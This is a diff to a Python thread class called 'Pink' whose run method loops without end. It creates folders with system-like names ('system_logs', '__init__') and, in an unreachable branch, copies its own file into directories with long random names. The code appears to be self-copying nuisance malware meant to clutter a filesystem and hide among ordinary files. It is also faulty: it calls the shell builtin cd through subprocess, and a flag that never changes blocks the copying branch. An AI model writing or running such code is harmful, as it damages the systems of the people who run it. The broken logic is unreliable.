@@ -19,22 +19,27 @@ class Pink(threading.Thread):
 	def __init__(self):
 		threading.Thread.__init__(self)
 
+
+
 	def run(self):
+		Bool = False
 		while True:
-			
-			for i in range(8):
+			if Bool == False:
 				subprocess.call(['cd', '..'])
 			
-			subprocess.call(['mkdir', 'system_logs'])
-			subprocess.call(['mkdir', 'logs'])
-			subprocess.call(['mkdir', '__init__'])
+				subprocess.call(['mkdir', 'system_logs'])
+				subprocess.call(['mkdir', 'logs'])
+				subprocess.call(['mkdir', '__init__'])
 
-			DIR_NAME_P1 = RANDOM_(32)
-			DIR_NAME_P2 = RANDOM_(32)
-			DIR_NAME_P3 = RANDOM_(32)
-			DIR_NAME_P4 = RANDOM_(32)
+			else:
 
-			DirectoryName = DIR_NAME_P1+ DIR_NAME_P2 + DIR_NAME_P3 + DIR_NAME_P4
-			subprocess.call(['mkdir', DirectoryName])
-			subprocess.call(['cp', NAME, DirectoryName])
-			subprocess.call(['mkdir', "DON'T DO ANYTHING"])
+
+				DIR_NAME_P1 = RANDOM_(32)
+				DIR_NAME_P2 = RANDOM_(32)
+				DIR_NAME_P3 = RANDOM_(32)
+				DIR_NAME_P4 = RANDOM_(32)
+
+				DirectoryName = DIR_NAME_P1+ DIR_NAME_P2 + DIR_NAME_P3 + DIR_NAME_P4
+				subprocess.call(['mkdir', DirectoryName])
+				subprocess.call(['cp', NAME, DirectoryName])
+				subprocess.call(['mkdir', "DON'T DO ANYTHING"])
